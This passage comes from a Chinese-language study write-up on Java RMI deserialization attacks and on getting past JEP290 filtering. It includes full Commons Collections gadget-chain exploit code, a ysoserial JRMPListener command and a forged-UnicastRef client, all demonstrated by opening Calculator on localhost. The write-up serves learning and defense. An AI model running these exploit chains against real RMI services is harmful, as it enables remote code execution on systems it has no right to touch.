                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map map = new HashMap();
            map.put("value", "test");
            Map transformedMap = TransformedMap.decorate(map, null, transformerChain);
            Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
            ctor.setAccessible(true);
            Object instance = ctor.newInstance(Target.class, transformedMap);
            return instance;
        }
    }
服务器端会执行命令：
### 四、服务端攻击客户端
跟客户端攻击服务端一样，在客户端调用一个远程方法时，只需要控制返回的对象是一个恶意对象就可以进行反序列化漏洞的利用了。这里我在原来RMI测试例子的基础上加了一个`getwork()`方法。
UserImpl.java
    package SimpleRMI_2;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.rmi.RemoteException;
    import java.rmi.server.UnicastRemoteObject;
    import java.util.HashMap;
    import java.util.Map;
    public class UserImpl extends UnicastRemoteObject implements User {
        public UserImpl() throws RemoteException{
            super();
        }
        public String name(String name) throws RemoteException{
            return name;
        }
        public void say(String say) throws  RemoteException{
            System.out.println("you speak" + say);
        }
        public void dowork(Object work) throws  RemoteException{
            System.out.println("your work is " + work);
        }
        public Object getwork() throws RemoteException {
            Object evalObject = null;
            try {
                Transformer[] transformers = new Transformer[] {
                        new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod",
                                new Class[] {String.class, Class[].class},
                                new Object[] {"getRuntime", new Class[0]}),
                        new InvokerTransformer("invoke",
                                new Class[] {Object.class, Object[].class},
                                new Object[] {null, new Object[0] }),
                        new InvokerTransformer("exec",
                                new Class[] {String.class},
                                new Object[] {"open -a Calculator"})
                };
                Transformer transformerChain = new ChainedTransformer(transformers);
                Map innerMap = new HashMap();
                innerMap.put("value", "Threezh1");
                Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
                Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
                Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
                cons.setAccessible(true);
                evalObject = cons.newInstance(java.lang.annotation.Retention.class, outerMap);
            }catch (Exception e){
                e.printStackTrace();
            }
            return evalObject;
        }
    }
开启`Server`之后，在`Client`端调用`getwork()`方法即可以攻击成功。
## JEP290
### 什么是JEP290？
JEP290是来限制能够被反序列化的类，主要包含以下几个机制：
  1. 提供一个限制反序列化类的机制，白名单或者黑名单。
  2. 限制反序列化的深度和复杂度。
  3. 为RMI远程调用对象提供了一个验证类的机制。
  4. 定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器。
JEP290支持的版本：
  * Java™ SE Development Kit 8, Update 121 (JDK 8u121)
  * Java™ SE Development Kit 7, Update 131 (JDK 7u131)
  * Java™ SE Development Kit 6, Update 141 (JDK 6u141)
JEP290需要手动设置，只有设置了之后才会有过滤，没有设置的话就还是可以正常的反序列化漏洞利用。所以如果是Client端和Server端互相攻击是没有过滤的。
设置JEP290的方式有下面两种：
  1. 通过setObjectInputFilter来设置filter
  2. 直接通过conf/security/java.properties文件进行配置 [参考](http://openjdk.java.net/jeps/290)
### Bypass JEP290
#### Registry通过setObjectInputFilter来设置filter过程分析
测试环境：
    JDK 8u131
pom.xml
        commons-collections
        commons-collections
        3.2.1
测试例子：
    package test;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.Remote;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.HashMap;
    import java.util.Map;
    public class UserServerEval {
        public static void main(String[] args) throws Exception {
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",
                            new Class[] {String.class, Class[].class},
                            new Object[] {"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke",
                            new Class[] {Object.class, Object[].class},
                            new Object[] {null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] {String.class},
                            new Object[] {"open -a Calculator"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            innerMap.put("value", "Threezh1");
            Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
            Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
            cons.setAccessible(true);
            InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);
            Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject));
            Registry registry = LocateRegistry.createRegistry(3333);
            Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 3333);
            registry_remote.bind("HelloRegistry", proxyEvalObject);
            System.out.println("rmi start at 3333");
        }
    }
在创建注册中心过程中存在一个`setObjectInputFilter`的过程，因此在客户端(这里代表Server和Client端)攻击注册中心过程中会被过滤。比如这里我给注册中心绑定了一个`Common-collection5`的恶意对象，结果是报错了，报错信息为：`filter status REJECTED`。说明传入的恶意对象被拦截了。
接着来跟一下注册中心创建的流程，看看`setObjectInputFilter`的过程到底是怎么样的。
首先到了`RegistryImpl`方法处，可以看到，实例化`UnicastServerRef`时第二个参数传入的是`RegistryImpl::registryFilter`。传入之后的值赋值给了`this.Filter`
看一下`registryFilter`这个方法：
这里的`registryFilter`默认为null，可以先不管这个判断，后面返回的内容相当于配置了一个白名单，当传入的类不属于白名单的内容时，则会返回`REJECTED`，否则就会返回`ALLOWED`。白名单如下：
    String.class
    Number.class
    Remote.class
    Proxy.class
    UnicastRef.class
    RMIClientSocketFactory.class
    RMIServerSocketFactory.class
    ActivationID.class
    UID.class
在`bind()`操作请求后，注册中心的接收端会调用oldDispatch方法，文件地址：`jdk1.8.0_131.jdk/Contents/Home/jre/lib/rt.jar!/sun/rmi/server/UnicastServerRef.class`。最终是会去调用`this.skel.dispatch`去绑定服务的。在这句之前有一个`this.unmarshalCustomCallData(var18);`跟入进去看看。
可以看到在这里调用了`Config.setObjectInputFilter`设置了过滤。`UnicastServerRef.this.filter`就是之前实例化`UnicastServerRef`时所设置的。规则就是之前所说的白名单，不属于那个白名单的类就不允许被反序列化。
那这个过程其实就是`Registry`在处理请求的过程中设置了一个过滤器来防范注册中心被反序列化漏洞攻击。有过滤就有绕过，这里的绕过方式是什么样的呢？
#### Bypass 复现
  1. 用`ysoserial`启动一个恶意的`JRMPListener`(`CommonCollections1`的链在1.8下用不了，所以这里用了`CommonCollections5`的)
  2. 启动注册中心
  3. 启动Client调用`bind()`操作
  4. 注册中心被反序列化攻击
    java -cp ysoserial.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections5 "open -a Calculator"
UserServer.java
    package test;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class UserServer {
        public static void main(String[] args) throws Exception{
            Registry registry = LocateRegistry.createRegistry(2222);
            User user = new UserImpl();
            registry.rebind("HelloRegistry", user);
            System.out.println("rmi start at 2222");
        }
    }
TestClient.java
    import sun.rmi.server.UnicastRef;
    import sun.rmi.transport.LiveRef;
    import sun.rmi.transport.tcp.TCPEndpoint;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Proxy;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.rmi.server.ObjID;
    import java.rmi.server.RemoteObjectInvocationHandler;
    import java.util.Random;
    public class TestClient {
        public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException {
            Registry reg = LocateRegistry.getRegistry("localhost",2222); // rmi start at 2222
            ObjID id = new ObjID(new Random().nextInt());
            TCPEndpoint te = new TCPEndpoint("127.0.0.1", 3333); // JRMPListener's port is 3333
            UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
            RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
            Registry proxy = (Registry) Proxy.newProxyInstance(TestClient.class.getClassLoader(), new Class[] {
                    Registry.class
            }, obj);
            reg.bind("Hello",proxy);
        }
    }
#### UnicastRef Bypass JEP290 分析 (jdk<=8u231)
这里的绕过原理图参考了的Hu3sky师傅文章里面的，相对来说比较好理解(注意我这里演示的JRMP端在3333端口)：
通过UnicastRef对象建立一个JRMP连接，JRMPListener端将序列化传给注册中心反序列化的过程中没有`setObjectInputFilter`，传给注册中心的恶意对象会被反序列化进而攻击成功。
TestClient里面的语句是从[ysoserial/payloads/JRMPClient.java](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/JRMPClient.java)里面取的，主要作用就是传递一个`UnicastRef`来给注册中心传递恶意对象。并且这个payload里面的对象都是在白名单里的，不会被拦截。
客户端调用`LocateRegistry.getRegistry`获取注册中心后，获得的是一个封装了UnicastRef对象的`RegistryImpl_Stub`对象，其中`UnicastRef`对象用于与注册中心创建通信。
这个payload的原理就是伪造了一个`UnicastRef`用于跟注册中心通信，我们从`bind()`方法开始分析一下这一整个流程。
当我们调用`bind()`方法时，注册中心处理数据的时候会对数据进行反序列化。使用的是readObject方法最终是调用了`RemoteObjectInvocationHandler`父类`RemoteObject`的`readObject`(`RemoteObjectInvocationHandler`没有实现`readObject`方法)。
跟入`readObject()`，最后有一个`ref.readExternal(in);`，这个`readObject()`的调用链：
继续跟入：
可以看到这里把payload里所传入的`LiveRef`解析到`var5`变量处，里面包含了`ip`与`端口`信息(JRMPListener的端口)。这些信息将用于后面注册中心与JRMP端建立通信。
接着再回到`dispatch`那里，在调用了`readObject`方法之后调用了`var2.releaseInputStream();`，持续跟入：
继续跟入`this.in.registerRefs();`：
可以看到这里的传利的`var2`就是之前的`ip`和`端口`信息。继续跟入：
`EndpointEntry`创建了一个`DGCImpl_Stub`，最后`DGCCient.EndpointEntry`返回的`var2`是一个`DGCClient`对象：
继续跟入`var2.registerRef`：
最后一行调用了`this.makeDirtyCall`并传入了`DGCClient`对象：
调用了`this.dgc.dirty`方法：
在这里注册中心就跟JRMP开始建立连接了：通过`newCall`建立连接，`writeObject`写入要请求的数据，`invoke`来处理传输数据。这里是将数据发送到JRMP端，继续跟入看下在哪里接收的JRMP端的数据。跟入`super.ref.invoke(var5);`。
跟入`var1.executeCall()`：
JRMP端发过来的数据会在这里被反序列化，这一个过程是没有调用`setObjectInputFilter`的，`serialFilter`也就为空，所以只需要让JRMP端返回一个恶意对象就可以攻击成功了。而这个JRMP端可以直接用`ysoserial`启动。
判断`serialFilter`的`filterCheck`方法调用链如下：
#### Bypass JEP290 (jdk=8u231)
在JDK8u231的`dirty`函数中多了`setObjectInputFilter`过程，所以用`UnicastRef`就没法再进行绕过了。
国外安全研究人员`@An Trinhs`发现了一个gadgets利用链，能够直接反序列化`UnicastRemoteObject`造成反序列化漏洞。
可以参考Hu3sky师傅的分析文章：[RMI Bypass Jep290(Jdk8u231)
反序列化漏洞分析](https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1)
## 总结
RMI是我学习JAVA安全的第二个着重学习的内容了，花了接近两周才把知识给整理完，学起来还是很吃力的。不过在这不停的踩坑、调试过程中，学到的知识也是不少的。
## 参考
  * [java RMI原理详解](https://blog.csdn.net/xinghun_4/article/details/45787549)
  * [分布式架构基础:Java RMI详解](https://www.jianshu.com/p/de85fad05dcb)
  * [Java入坑：Apache-Commons-Collections-3.1 反序列化漏洞分析](https://0day.design/2020/01/24/Apache-Commons-Collections-3.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
  * [JAVA RMI 反序列化知识详解](https://paper.seebug.org/1194/)
  * [基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI](https://xz.aliyun.com/t/7079)
  * Java-RMI-学习总结 - p1g3
  * Java RMI 反序列化漏洞 - Hu3sky